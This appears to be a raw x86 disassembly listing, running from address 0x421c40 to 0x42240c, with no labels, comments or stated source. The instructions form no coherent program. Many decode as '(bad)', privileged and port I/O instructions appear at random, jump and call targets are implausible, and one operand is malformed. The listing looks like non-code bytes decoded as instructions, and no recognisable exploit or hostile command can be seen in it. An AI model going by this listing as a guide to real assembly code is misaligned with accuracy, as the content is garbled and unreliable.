  421c40:	xchg   ebx,eax
  421c41:	pop    edx
  421c42:	mov    eax,0xac791a93
  421c47:	push   ebx
  421c48:	jo     0x421c42
  421c4a:	out    dx,eax
  421c4b:	cmp    eax,0xff32db6e
  421c50:	jl     0x421c82
  421c52:	in     al,dx
  421c53:	lahf   
  421c54:	push   ds
  421c55:	hlt    
  421c56:	ins    BYTE PTR es:[edi],dx
  421c57:	ret    
  421c58:	aaa    
  421c59:	mov    esi,0x111ee0d7
  421c5e:	cmp    al,0xf3
  421c60:	xchg   esp,eax
  421c61:	push   esp
  421c62:	test   DWORD PTR [ecx+0x6d94c751],esi
  421c68:	out    dx,eax
  421c69:	sar    BYTE PTR [edi],cl
  421c6b:	mov    ebx,0x28fe0039
  421c70:	push   eax
  421c71:	xchg   ebp,eax
  421c72:	dec    ebx
  421c73:	add    DWORD PTR [ebx],ebx
  421c75:	loop   0x421ce5
  421c77:	cmp    BYTE PTR [ebp-0x3],al
  421c7a:	push   edi
  421c7b:	rol    DWORD PTR [ebp-0x65],1
  421c7e:	pop    edi
  421c7f:	add    BYTE PTR [eax+0x3c],al
  421c82:	mov    edi,0xe7ee820
  421c87:	pop    ebp
  421c88:	aam    0x45
  421c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c8b:	adc    BYTE PTR [esi],dh
  421c8d:	and    DWORD PTR [edx-0x19],ebp
  421c90:	mov    al,ds:0x31d9df50
  421c95:	add    ah,cl
  421c97:	cld    
  421c98:	enter  0x9f86,0xe5
  421c9c:	clc    
  421c9d:	xlat   BYTE PTR ds:[ebx]
  421c9e:	add    DWORD PTR [eax-0x2650a6bb],esp
  421ca4:	xlat   BYTE PTR ds:[ebx]
  421ca5:	loope  0x421cca
  421ca7:	or     BYTE PTR [eax+0x6f],ch
  421caa:	jae    0x421cdc
  421cac:	fisubr DWORD PTR [edx+0x7b89c2be]
  421cb2:	or     BYTE PTR [ebx-0x67],0x46
  421cb6:	dec    edi
  421cb7:	mov    eax,0x8a3f086b
  421cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cbd:	push   0xffffff84
  421cbf:	fisub  WORD PTR [esi-0x62646c5a]
  421cc5:	arpl   WORD PTR [edx],bx
  421cc7:	inc    esp
  421cc8:	daa    
  421cc9:	xor    al,BYTE PTR [ebx+0x1f1a9695]
  421ccf:	and    al,0x96
  421cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cd2:	popf   
  421cd3:	lods   eax,DWORD PTR ds:[esi]
  421cd4:	push   cs
  421cd5:	mov    ebx,0x151c045e
  421cda:	vandps ymm0,ymm4,ymm1
  421cde:	add    bl,BYTE PTR [esi+edi*4]
  421ce1:	cmp    cl,BYTE PTR [ecx+0x46a21e93]
  421ce7:	push   edi
  421ce8:	mov    ch,BYTE PTR [edx+ebx*8+0x71]
  421cec:	(bad)  
  421ced:	mov    eax,0xb5cdac18
  421cf2:	iret   
  421cf3:	sub    esp,DWORD PTR [ebp+ebp*8-0x1a]
  421cf7:	aad    0xe4
  421cf9:	fsubr  DWORD PTR [eax+0x17a068f6]
  421cff:	inc    edx
  421d00:	or     eax,0x402807f
  421d05:	or     ebx,eax
  421d07:	add    BYTE PTR [esp+ebp*2+0x74],dh
  421d0b:	push   esi
  421d0c:	mov    ebx,0xfdd6f91a
  421d11:	cmp    ecx,DWORD PTR [eax]
  421d13:	add    bh,BYTE PTR [esi+0x55fa9633]
  421d19:	pop    ecx
  421d1a:	in     eax,dx
  421d1b:	mov    esp,0x6c8ab683
  421d20:	adc    eax,0x31d7e10b
  421d25:	mul    BYTE PTR [ebx]
  421d27:	test   al,0xae
  421d29:	(bad)  
  421d2a:	push   0x18
  421d2c:	jno    0x421cc0
  421d2e:	(bad)  
  421d2f:	repnz aas 
  421d31:	pop    edx
  421d32:	cld    
  421d33:	rol    DWORD PTR [ecx],cl
  421d35:	and    eax,0xf23aed55
  421d3a:	pop    ecx
  421d3b:	in     al,0x76
  421d3d:	pop    dx
  421d3f:	pop    ebp
  421d40:	popf   
  421d41:	inc    ebp
  421d42:	inc    edx
  421d43:	xchg   edi,eax
  421d44:	inc    ebx
  421d45:	and    BYTE PTR [edi+0x5f],dh
  421d48:	mov    eax,ds:0x4ec4afb6
  421d4d:	(bad)  
  421d4e:	jbe    0x421dbe
  421d50:	inc    eax
  421d51:	lods   al,BYTE PTR ds:[esi]
  421d52:	push   ebx
  421d53:	add    cl,dh
  421d55:	or     ah,BYTE PTR ds:0x4c1366eb
  421d5b:	icebp  
  421d5c:	adc    eax,0x4248fbde
  421d61:	lods   al,BYTE PTR ds:[esi]
  421d62:	test   cl,0x6b
  421d65:	inc    edi
  421d66:	mov    dh,0x2d
  421d68:	lods   eax,DWORD PTR ds:[esi]
  421d69:	jp     0x421d3c
  421d6b:	adc    bh,BYTE PTR [edx+0x79]
  421d6e:	xlat   BYTE PTR ds:[ebx]
  421d6f:	stos   DWORD PTR es:[edi],eax
  421d70:	push   edi
  421d71:	cs sub eax,0xeed4eb54
  421d77:	fs lahf 
  421d79:	hlt    
  421d7a:	adc    eax,ebp
  421d7c:	push   esi
  421d7d:	jecxz  0x421d27
  421d7f:	retf   0x98e7
  421d82:	int    0x34
  421d84:	sbb    eax,0x4f6186fc
  421d89:	inc    ebp
  421d8a:	mov    ds,ebp
  421d8c:	pusha  
  421d8d:	out    dx,eax
  421d8e:	inc    eax
  421d8f:	push   eax
  421d90:	adc    eax,0x815c4368
  421d95:	add    eax,0xa9d8cd85
  421d9a:	shrd   DWORD PTR [ebx-0x11],edi,cl
  421d9e:	pop    ecx
  421d9f:	or     ah,BYTE PTR [edx]
  421da1:	inc    ebp
  421da2:	sbb    ecx,ecx
  421da4:	popa   
  421da5:	cli    
  421da6:	add    eax,0x244c5be7
  421dab:	sbb    edx,DWORD PTR [eax-0x4c]
  421dae:	inc    edx
  421daf:	or     esp,DWORD PTR [ecx-0x24cc0d64]
  421db5:	retf   
  421db6:	popw   ss
  421db8:	clc    
  421db9:	jb     0x421dfc
  421dbb:	mov    BYTE PTR [edx-0x4d],dl
  421dbe:	aad    0xf3
  421dc0:	lods   al,BYTE PTR ds:[esi]
  421dc1:	jne    0x421da0
  421dc3:	pop    ds
  421dc4:	sub    eax,0x9c023463
  421dc9:	jle    0x421d9f
  421dcb:	loopne 0x421d7c
  421dcd:	rcr    DWORD PTR [edx-0x9972448],0x61
  421dd4:	xor    dh,BYTE PTR [eax+ebp*2+0x110849ce]
  421ddb:	fs in  eax,dx
  421ddd:	pusha  
  421dde:	rcl    BYTE PTR ds:0xc9b0a930,0xf0
  421de5:	(bad)  
  421de6:	adc    eax,DWORD PTR [edi-0x791765e0]
  421dec:	inc    edi
  421ded:	jge    0x421d96
  421def:	pop    eax
  421df0:	push   eax
  421df1:	je     0x421dfe
  421df3:	sbb    eax,0xaea639ff
  421df8:	repnz pop edx
  421dfa:	fst    QWORD PTR [eax+0x43]
  421dfd:	lock pop ds
  421dff:	loop   0x421d9d
  421e01:	add    al,0xf5
  421e03:	add    BYTE PTR [esi],bl
  421e05:	mov    WORD PTR [ebx+0x3791fa31],gs
  421e0b:	js     0x421dda
  421e0d:	push   ebx
  421e0e:	std    
  421e0f:	stos   DWORD PTR es:[edi],eax
  421e10:	inc    ebx
  421e11:	pop    esp
  421e12:	sub    eax,0xff56c9bf
  421e17:	xlat   BYTE PTR ds:[ebx]
  421e18:	xchg   ebx,eax
  421e19:	pushf  
  421e1a:	push   eax
  421e1b:	jg     0x421df2
  421e1d:	out    dx,eax
  421e1e:	push   ebx
  421e1f:	adc    al,0xf2
  421e21:	out    dx,al
  421e22:	and    eax,0xc845d651
  421e27:	retf   0x4bc8
  421e2a:	hlt    
  421e2b:	lea    ebx,[eax+0x3dc95964]
  421e31:	push   ebp
  421e32:	stos   BYTE PTR es:[edi],al
  421e33:	sbb    DWORD PTR [ebx],0x766dc717
  421e39:	xor    bh,BYTE PTR [esi+0x546a952e]
  421e3f:	inc    ebx
  421e40:	xchg   ecx,eax
  421e41:	(bad)  
  421e42:	aad    0x40
  421e44:	or     al,0x95
  421e46:	add    eax,0x2e6e46b1
  421e4b:	pop    ecx
  421e4c:	popa   
  421e4d:	dec    edx
  421e4e:	ss pusha 
  421e50:	adc    DWORD PTR [eax],0xffffffe5
  421e53:	mov    esp,0x84ebcb38
  421e58:	add    DWORD PTR [ecx],0x7c
  421e5b:	ds call 0x58b09f45
  421e61:	popf   
  421e62:	mov    al,0x5e
  421e64:	sub    BYTE PTR [edx],ah
  421e66:	ins    DWORD PTR es:[edi],dx
  421e67:	leave  
  421e68:	mov    edx,0x35518916
  421e6d:	pushf  
  421e6e:	sub    eax,0x64411d80
  421e73:	data16 es stc 
  421e76:	data16 xchg BYTE PTR [ebp-0x10],dl
  421e7a:	push   0x8e665a9d
  421e7f:	lods   al,BYTE PTR ds:[esi]
  421e80:	add    al,0xe9
  421e82:	jmp    0x421e14
  421e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e85:	pop    ebx
  421e86:	and    dl,BYTE PTR [edx-0x7e774e2]
  421e8c:	mov    bh,0xd3
  421e8e:	mov    ah,0x0
  421e90:	mov    edi,0x7a42e1c2
  421e95:	pop    edi
  421e96:	inc    ebx
  421e97:	xchg   BYTE PTR [ebx-0x80],bh
  421e9a:	and    eax,0x6f54bfdc
  421e9f:	gs xor eax,0x622a462f
  421ea5:	std    
  421ea6:	mov    DWORD PTR [ebx],ecx
  421ea8:	(bad)  
  421ea9:	dec    eax
  421eaa:	pop    ebx
  421eab:	ds cmp al,0xb
  421eae:	fbld   TBYTE PTR [esp+esi*4]
  421eb1:	ins    DWORD PTR es:[edi],dx
  421eb2:	mov    gs,ebx
  421eb4:	icebp  
  421eb5:	and    DWORD PTR [ebx],0x7df3cd82
  421ebb:	cdq    
  421ebc:	or     cl,al
  421ebe:	jge    0x421e5f
  421ec0:	(bad)  
  421ec1:	aas    
  421ec2:	add    DWORD PTR [ebx],esp
  421ec4:	mov    eax,0xec4bb316
  421ec9:	push   ss
  421eca:	ror    DWORD PTR [edi-0x31],1
  421ecd:	sbb    eax,0xd9ec05e0
  421ed2:	ja     0x421ef6
  421ed4:	push   es
  421ed5:	push   ebp
  421ed6:	sub    esi,DWORD PTR [edx]
  421ed8:	sti    
  421ed9:	jbe    0x421f16
  421edb:	mov    bl,BYTE PTR [ebp-0x6d94b750]
  421ee1:	mov    ebx,0x8cc06307
  421ee6:	jns    0x421eed
  421ee8:	inc    edx
  421ee9:	call   ebx
  421eeb:	ror    BYTE PTR [ecx-0x13bea903],1
  421ef1:	adc    DWORD PTR [edx+0x7cd15db0],ebp
  421ef7:	or     BYTE PTR [ecx+0x5b],ch
  421efa:	fistp  QWORD PTR [eax+0x21]
  421efd:	pop    ss
  421efe:	mov    cl,0xbc
  421f00:	xchg   cl,dh
  421f02:	jb     0x421ebb
  421f04:	das    
  421f05:	add    al,0x17
  421f07:	sbb    eax,0xabd0796c
  421f0c:	sub    eax,0xc3d1266f
  421f11:	shl    DWORD PTR [esi+edx*8+0x67e9af06],cl
  421f18:	ficom  DWORD PTR [esi-0x69]
  421f1b:	sbb    edx,edi
  421f1d:	pusha  
  421f1e:	xchg   edi,eax
  421f1f:	ins    DWORD PTR es:[edi],dx
  421f20:	pop    edi
  421f21:	adc    al,0xc9
  421f23:	repz cld 
  421f25:	mov    cl,al
  421f27:	pop    edi
  421f28:	dec    esp
  421f29:	pusha  
  421f2a:	sbb    al,0xe1
  421f2c:	jns    0x421ee4
  421f2e:	out    dx,eax
  421f2f:	xor    ebp,DWORD PTR ds:0x8b1e6e11
  421f35:	xor    BYTE PTR [edi],cl
  421f37:	mov    WORD PTR [ebp+0x1a15036],fs
  421f3d:	ja     0x421ef6
  421f3f:	arpl   WORD PTR [edi+edx*4],bp
  421f42:	dec    edi
  421f43:	ins    DWORD PTR es:[edi],dx
  421f44:	adc    cl,BYTE PTR [ecx-0x74]
  421f47:	leave  
  421f48:	in     eax,dx
  421f49:	push   0xffffffa5
  421f4b:	or     bh,BYTE PTR [edi+0x48]
  421f4e:	or     al,0x7a
  421f50:	jbe    0x421eee
  421f52:	mov    edx,0x643023aa
  421f57:	test   BYTE PTR [edx+0x2f1e911a],cl
  421f5d:	and    al,0xe4
  421f5f:	sub    al,0x5c
  421f61:	hlt    
  421f62:	inc    eax
  421f63:	std    
  421f64:	in     eax,dx
  421f65:	xor    al,0x4c
  421f67:	addr16 mov esp,0x3b554ccc
  421f6d:	push   es
  421f6e:	mov    ch,0x48
  421f70:	jmp    0xe9988c8f
  421f75:	ret    
  421f76:	pop    ebp
  421f77:	jo     0x421fb5
  421f79:	sub    bl,BYTE PTR [esi-0x6ee8553c]
  421f7f:	mov    ecx,0xb14e3241
  421f84:	es sbb bh,dl
  421f87:	xchg   bl,ah
  421f89:	mul    DWORD PTR [edi-0x22]
  421f8c:	jb     0x421f20
  421f8e:	add    bl,ch
  421f90:	es cmp eax,0x48444353
  421f96:	dec    esi
  421f97:	repnz imul DWORD PTR [edx+0x3c8d8f42]
  421f9e:	cmp    eax,0xc07f41ea
  421fa3:	cs in  eax,dx
  421fa5:	test   eax,0xc163422
  421faa:	in     al,0xb7
  421fac:	or     ah,bl
  421fae:	gs int3 
  421fb0:	sbb    edx,edi
  421fb2:	int3   
  421fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb4:	not    BYTE PTR ds:0x3bb0b14b
  421fba:	nop
  421fbb:	pop    esp
  421fbc:	mov    ah,0xe1
  421fbe:	adc    al,0x9c
  421fc0:	push   ecx
  421fc1:	push   ebx
  421fc2:	inc    edi
  421fc3:	mov    cl,0x61
  421fc5:	(bad)  
  421fc6:	cmc    
  421fc7:	fld    TBYTE PTR [ecx-0x73]
  421fca:	and    BYTE PTR ds:0x374933e5,ch
  421fd0:	test   DWORD PTR [ebp+edi*2-0x8c52fe4],esp
  421fd7:	inc    eax
  421fd8:	test   DWORD PTR [eax],ecx
  421fda:	pop    esi
  421fdb:	test   al,0xc
  421fdd:	sysret 
  421fdf:	popf   
  421fe0:	mov    WORD PTR [edx-0x14],gs
  421fe3:	repz leave 
  421fe5:	aaa    
  421fe6:	ins    BYTE PTR es:[edi],dx
  421fe7:	cmp    edx,DWORD PTR [esi+0x1e16de1b]
  421fed:	dec    ecx
  421fee:	imul   ebp,DWORD PTR [esi],0x1c2c527b
  421ff4:	xchg   ebp,eax
  421ff5:	mov    dl,0x3b
  421ff7:	test   eax,0xbfe87f10
  421ffc:	aam    0x8d
  421ffe:	lahf   
  421fff:	mov    ch,0x4d
  422001:	push   ss
  422002:	pop    esi
  422003:	lahf   
  422004:	push   ecx
  422005:	fs fs pop esp
  422008:	add    BYTE PTR [ebp+0x4217f338],0xe4
  42200f:	es sub eax,0xbe1123fa
  422015:	cld    
  422016:	stos   BYTE PTR es:[edi],al
  422017:	loopne 0x421fc5
  422019:	dec    eax
  42201a:	or     DWORD PTR [edx+0x48],0xffffffe1
  42201e:	sub    al,0xee
  422020:	sub    eax,0x8635cf8e
  422025:	not    DWORD PTR [eax]
  422027:	repz xor BYTE PTR [ebp+ebx*2+0x4f],0x12
  42202d:	mov    bl,0x3c
  42202f:	cdq    
  422030:	fstp   TBYTE PTR [edx]
  422032:	jp     0x42206a
  422034:	inc    eax
  422035:	int3   
  422036:	cdq    
  422037:	xchg   edx,eax
  422038:	loope  0x422099
  42203a:	and    al,BYTE PTR [ecx-0x61]
  42203d:	adc    esi,edi
  42203f:	xlat   BYTE PTR ds:[ebx]
  422040:	scas   al,BYTE PTR es:[edi]
  422041:	call   0x60aab636
  422046:	cld    
  422047:	fstp   TBYTE PTR [edx]
  422049:	cmc    
  42204a:	xor    dl,bh
  42204c:	inc    eax
  42204d:	loop   0x422084
  42204f:	test   BYTE PTR [edx],ah
  422051:	loopne 0x421fd9
  422053:	loopne 0x422089
  422055:	repnz adc eax,0x9e20d66
  42205b:	ret    
  42205c:	ja     0x422032
  42205e:	push   es
  42205f:	push   es
  422060:	pop    ss
  422061:	leave  
  422062:	dec    esp
  422063:	fist   DWORD PTR [eax]
  422065:	cmc    
  422066:	and    al,BYTE PTR [esi]
  422068:	retf   
  422069:	add    al,0x2e
  42206b:	ds retf 
  42206d:	shr    DWORD PTR [eax],cl
  42206f:	sub    BYTE PTR ss:[eax-0x5d],dl
  422073:	mov    dl,BYTE PTR [ebx]
  422075:	mov    DWORD PTR [edx],edx
  422077:	gs in  eax,0x94
  42207a:	ja     0x42209d
  42207c:	mov    eax,ds:0x94b751f4
  422081:	pop    esp
  422082:	cdq    
  422083:	std    
  422084:	call   0x47980508
  422089:	jge    0x42201e
  42208b:	aas    
  42208c:	mov    ch,0xc1
  42208e:	adc    bh,BYTE PTR [eax]
  422090:	dec    esi
  422091:	mov    ds:0x3ed2a41f,eax
  422096:	jle    0x422052
  422098:	stos   BYTE PTR es:[edi],al
  422099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42209a:	xchg   edi,eax
  42209b:	loop   0x422080
  42209d:	xchg   edi,eax
  42209e:	push   ss
  42209f:	jb     0x4220de
  4220a1:	mov    bl,ch
  4220a3:	pop    es
  4220a4:	xor    DWORD PTR [edx+0x37],edx
  4220a7:	pop    ss
  4220a8:	das    
  4220a9:	fstp   DWORD PTR [edi]
  4220ab:	or     edx,DWORD PTR [esi+esi*2+0xc4507c3]
  4220b2:	jae    0x422053
  4220b4:	xor    eax,0x8d3e93a6
  4220b9:	inc    esi
  4220ba:	pop    ecx
  4220bb:	mov    ebx,0x8516baf0
  4220c0:	ins    DWORD PTR es:[edi],dx
  4220c1:	xchg   ecx,eax
  4220c2:	(bad)  
  4220c3:	mov    ds:0x3db5be35,al
  4220c8:	xchg   BYTE PTR [eax-0x727db395],ah
  4220ce:	xchg   esp,eax
  4220cf:	xor    esi,DWORD PTR [eax-0x4bd65316]
  4220d5:	call   0xfbca:0xa0209d86
  4220dc:	call   0x77f21e51
  4220e1:	inc    ebp
  4220e2:	mov    ah,0x52
  4220e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e7:	xchg   BYTE PTR [ebp+0x67edd19f],ah
  4220ed:	aam    0x2b
  4220ef:	iret   
  4220f0:	mov    bh,0x80
  4220f2:	xor    DWORD PTR gs:[esi+0x65363e8f],0x971bccc2
  4220fd:	jns    0x4220f8
  4220ff:	ret    
  422100:	add    al,0x85
  422102:	jmp    0x5040:0x30b25273
  422109:	adc    eax,0xcb2bafb0
  42210e:	jl     0x42217a
  422110:	imul   edx,esp,0xffffffb4
  422113:	scas   al,BYTE PTR es:[edi]
  422114:	dec    edx
  422115:	xchg   DWORD PTR [eax],edx
  422117:	or     eax,0xf4fbea9e
  42211c:	fmul   st,st(0)
  42211e:	jl     0x422189
  422120:	iret   
  422121:	jns    0x422134
  422123:	xchg   edx,eax
  422124:	test   BYTE PTR gs:[esi+0x404b6041],dh
  42212b:	cld    
  42212c:	dec    eax
  42212d:	jb     0x422188
  42212f:	int3   
  422130:	xchg   esp,eax
  422131:	xor    BYTE PTR [ebx-0x46],0xb4
  422135:	fadd   DWORD PTR [ecx-0x1040e49e]
  42213b:	mov    esp,0xa22dbd02
  422140:	push   esp
  422141:	out    0xe7,eax
  422143:	(bad)
  422146:	clc    
  422147:	and    bl,BYTE PTR [edi]
  422149:	xor    eax,0x897b34ce
  42214e:	neg    BYTE PTR [edi+0x5b294a49]
  422154:	nop
  422155:	mov    eax,ds:0xff895b53
  42215a:	adc    eax,DWORD PTR [edi]
  42215c:	imul   ebx,DWORD PTR [ebx+0x3c],0x76
  422160:	aad    0x9d
  422162:	inc    eax
  422163:	mov    esp,0xece1af64
  422168:	jle    0x42219f
  42216a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42216b:	pusha  
  42216c:	out    dx,eax
  42216d:	cwde   
  42216e:	repz inc edx
  422170:	adc    al,0xd5
  422172:	lods   al,BYTE PTR ds:[esi]
  422173:	rcl    bh,0x63
  422176:	xchg   BYTE PTR [ecx],dl
  422178:	cmp    BYTE PTR [eax-0xd],cl
  42217b:	jno    0x422194
  42217d:	outs   dx,DWORD PTR ds:[esi]
  42217e:	xchg   cl,bl
  422180:	scas   eax,DWORD PTR es:[edi]
  422181:	mov    edx,0xbd094cd
  422186:	add    BYTE PTR [edx+eiz*2-0x6f],ch
  42218a:	cmp    DWORD PTR [edi+0x3c3772f7],ebx
  422190:	popa   
  422191:	jmp    0xa081:0xf3b71d2b
  422198:	cmp    dh,bh
  42219a:	scas   al,BYTE PTR es:[edi]
  42219b:	jmp    0xc42a:0xbe1bdf36
  4221a2:	pop    esp
  4221a3:	arpl   WORD PTR [ecx+0x4f],cx
  4221a6:	imul   edx,DWORD PTR [ebp*4+0x44677b2a],0xeefd6be5
  4221b1:	lock scas al,BYTE PTR es:[edi]
  4221b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221b4:	xlat   BYTE PTR ds:[ebx]
  4221b5:	xchg   edi,eax
  4221b6:	dec    ebx
  4221b7:	add    al,BYTE PTR [edi-0x64d457bd]
  4221bd:	push   ds
  4221be:	xchg   edx,eax
  4221bf:	add    ebx,DWORD PTR [eax-0x9]
  4221c2:	xchg   esp,eax
  4221c3:	inc    ebp
  4221c4:	repz mov edi,0xee75f4f0
  4221ca:	push   0xfa71141d
  4221cf:	jg     0x42219c
  4221d1:	ss or  eax,0x1d8a90fd
  4221d7:	push   eax
  4221d8:	ret    
  4221d9:	aam    0x6c
  4221db:	jo     0x37f8c72b
  4221e1:	mov    al,ds:0x43ef4ff7
  4221e6:	(bad)  
  4221e7:	xor    dl,BYTE PTR [edx+0x67]
  4221ea:	jle    0x422204
  4221ec:	add    al,0x69
  4221ee:	popf   
  4221ef:	stc    
  4221f0:	clc    
  4221f1:	xor    DWORD PTR [ebx-0x56b288f8],0x432fd266
  4221fb:	xchg   BYTE PTR [bx-0x28f5],cl
  422200:	cs out dx,eax
  422202:	xlat   BYTE PTR ds:[ebx]
  422203:	inc    eax
  422204:	mov    ebp,0xae00445f
  422209:	cmp    BYTE PTR [ebp+0x4c],bh
  42220c:	mov    edx,ds
  42220e:	cld    
  42220f:	xor    eax,DWORD PTR ds:0x6fca631f
  422215:	loop   0x4221a2
  422217:	iret   
  422218:	aam    0x9b
  42221a:	cmp    cl,BYTE PTR [edi]
  42221c:	push   ebp
  42221d:	cmp    edi,ebp
  42221f:	outs   dx,BYTE PTR ds:[esi]
  422220:	repnz repz mov dl,0x9f
  422224:	shl    edi,0x60
  422227:	adc    DWORD PTR [eax+0x5c],edx
  42222a:	sub    al,0x8c
  42222c:	mov    ecx,DWORD PTR [ecx-0x2ee81393]
  422232:	jne    0x422296
  422234:	out    dx,eax
  422235:	xor    DWORD PTR [ecx],edi
  422237:	int    0x54
  422239:	jnp    0x42224e
  42223b:	push   ebp
  42223c:	lds    ebp,FWORD PTR [ebx+0x2cf2af72]
  422242:	cmp    DWORD PTR [ebp+0x49],edi
  422245:	(bad)  
  422246:	and    DWORD PTR ds:0x117aecc8,edi
  42224c:	call   0x6686:0x2212940c
  422253:	pop    edx
  422254:	test   DWORD PTR [ebx+0x57],ebx
  422257:	jp     0x42227f
  422259:	xlat   BYTE PTR ds:[ebx]
  42225a:	xchg   BYTE PTR [edi],bh
  42225c:	or     BYTE PTR [ebp+0x701ddbc0],al
  422262:	sub    eax,DWORD PTR [esi]
  422264:	outs   dx,BYTE PTR ds:[esi]
  422265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422266:	adc    eax,ebx
  422268:	loop   0x4221ea
  42226a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42226b:	call   0x11cc:0xa4a74f63
  422272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422273:	ins    BYTE PTR es:[edi],dx
  422274:	rcl    BYTE PTR [ebp-0x70],0xd4
  422278:	imul   esp,esp,0x63
  42227b:	(bad)  
  42227d:	(bad)  
  42227e:	sub    esp,DWORD PTR [ecx-0x1f]
  422281:	daa    
  422282:	(bad)  
  422283:	fisubr WORD PTR [eax+0x1a8535a1]
  422289:	test   BYTE PTR [esi+ecx*2-0x63],ah
  42228d:	or     BYTE PTR [eax+ecx*2+0xfe887bd],dl
  422294:	dec    ecx
  422295:	dec    edx
  422296:	icebp  
  422297:	sub    eax,0xb5e596e4
  42229c:	mov    edx,0xfcacc11d
  4222a1:	xor    esi,ebx
  4222a3:	test   bh,bh
  4222a5:	add    esi,DWORD PTR [esi+eiz*8+0x1878cd3b]
  4222ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222ad:	mov    eax,0x8f2e1fbe
  4222b2:	sub    al,0x86
  4222b4:	mov    ?,WORD PTR [edi-0x71]
  4222b7:	ror    DWORD PTR [ebx],1
  4222b9:	leave  
  4222ba:	dec    esi
  4222bb:	cmp    edx,DWORD PTR [esi+0x37]
  4222be:	in     al,0x18
  4222c0:	stos   DWORD PTR es:[edi],eax
  4222c1:	or     ah,al
  4222c3:	sub    al,0x80
  4222c5:	cmp    eax,0x44667fd1
  4222ca:	dec    eax
  4222cb:	add    dl,BYTE PTR [esi+0x51]
  4222ce:	push   ebx
  4222cf:	pop    ecx
  4222d0:	sbb    DWORD PTR [eax+0xe],edx
  4222d3:	xchg   ebx,eax
  4222d4:	fcomp  QWORD PTR [eax+0x553450cb]
  4222da:	inc    ebp
  4222db:	jmp    FWORD PTR [ebx-0x613a816]
  4222e1:	es xchg edi,eax
  4222e3:	mov    eax,0x175e1ab
  4222e8:	mov    BYTE PTR [edx],0x5e
  4222eb:	test   eax,0xc10e503d
  4222f0:	mov    WORD PTR [edx],cs
  4222f2:	or     cl,BYTE PTR [esi-0x4c503e7c]
  4222f8:	sbb    ah,BYTE PTR [edx]
  4222fa:	and    cl,0xc4
  4222fd:	mov    al,ds:0x8e975be7
  422302:	enter  0x340d,0xa3
  422306:	into   
  422307:	pop    ds
  422308:	fwait
  422309:	jnp    0x42237d
  42230b:	adc    al,0x1a
  42230d:	sbb    BYTE PTR [ebx-0x788a139],0xd2
  422314:	xlat   BYTE PTR ds:[ebx]
  422315:	or     esi,DWORD PTR [ecx-0x1164ed38]
  42231b:	xor    eax,DWORD PTR [ebp+0x3e517d1e]
  422321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422322:	dec    esp
  422323:	fdivr  QWORD PTR [eax+0x34279f5e]
  422329:	icebp  
  42232a:	clc    
  42232b:	cmp    DWORD PTR gs:[eax+0x6486016b],edi
  422332:	xchg   esi,eax
  422333:	gs mov ah,0x4b
  422336:	dec    edi
  422337:	sub    esp,esp
  422339:	rcl    edx,1
  42233b:	pop    es
  42233c:	cmc    
  42233d:	loope  0x4222d0
  42233f:	loopne 0x422378
  422341:	mov    cl,0x50
  422343:	add    eax,0x8f8577f2
  422348:	add    ecx,ebx
  42234a:	icebp  
  42234b:	cdq    
  42234c:	sbb    bh,dl
  42234e:	jle    0x4222f7
  422350:	das    
  422351:	(bad)  
  422352:	mov    esp,0x5220622b
  422357:	fmul   QWORD PTR [ecx]
  422359:	adc    eax,0xbeae5566
  42235e:	mov    bl,0xfc
  422360:	dec    esi
  422361:	jbe    0x422345
  422363:	mov    ecx,0xad38f4a6
  422368:	mov    ebp,0x5857cc0f
  42236d:	enter  0x5e7b,0x93
  422371:	aad    0x7
  422373:	mov    dl,0x8
  422375:	dec    eax
  422376:	icebp  
  422377:	test   ah,cl
  422379:	popa   
  42237a:	daa    
  42237b:	adc    BYTE PTR [edi],dh
  42237d:	into   
  42237e:	test   eax,0x4cfa1933
  422383:	stos   BYTE PTR es:[edi],al
  422384:	mov    DWORD PTR [eax+eiz*1+0x4aeda98a],0x75fa9cc8
  42238f:	and    eax,0x1fa08709
  422394:	xchg   edi,eax
  422395:	cmp    DWORD PTR [edi-0x7feda165],esp
  42239b:	sbb    edi,esi
  42239d:	(bad)  
  42239e:	ds sbb al,0xf1
  4223a1:	arpl   WORD PTR [edx+0x34],cx
  4223a4:	pop    edx
  4223a5:	out    0xc9,eax
  4223a7:	in     al,dx
  4223a8:	and    dl,BYTE PTR [ebx]
  4223aa:	add    DWORD PTR [bx+si-0x6978],0x15cb95af
  4223b3:	jg     0x422379
  4223b5:	adc    BYTE PTR [ebx],bl
  4223b7:	xchg   esp,eax
  4223b8:	outs   dx,DWORD PTR ds:[esi]
  4223b9:	inc    eax
  4223ba:	and    DWORD PTR [ecx+0x2f7cffcf],0x2c
  4223c1:	pop    esi
  4223c2:	(bad)  
  4223c3:	pop    ds
  4223c4:	jb     0x422347
  4223c6:	dec    edi
  4223c7:	sub    ebp,DWORD PTR [ebp-0x7cc1ea4f]
  4223cd:	add    al,0xac
  4223cf:	cmp    BYTE PTR [ebp+0xcfd614b],cl
  4223d5:	scas   al,BYTE PTR es:[edi]
  4223d6:	stos   DWORD PTR es:[edi],eax
  4223d7:	es xchg esp,eax
  4223d9:	jmp    0x42242f
  4223db:	imul   ebp,DWORD PTR [eax+0x2c1aba38],0xba3b1c11
  4223e5:	mov    ds:0x34fdf793,eax
  4223ea:	pop    ss
  4223eb:	cmp    eax,0x7f24dfad
  4223f0:	fs pop ss
  4223f2:	les    eax,FWORD PTR [eax]
  4223f4:	add    DWORD PTR [ebp+edx*2+0x2dbc57ad],eax
  4223fb:	mov    ebx,ss
  4223fd:	int3   
  4223fe:	adc    eax,0xdba575e1
  422403:	mov    edx,DWORD PTR [eax+esi*4-0x4]
  422407:	aaa    
  422408:	push   edx
  422409:	adc    BYTE PTR [eax+eiz*2],cl
  42240c:	jae    0x422467
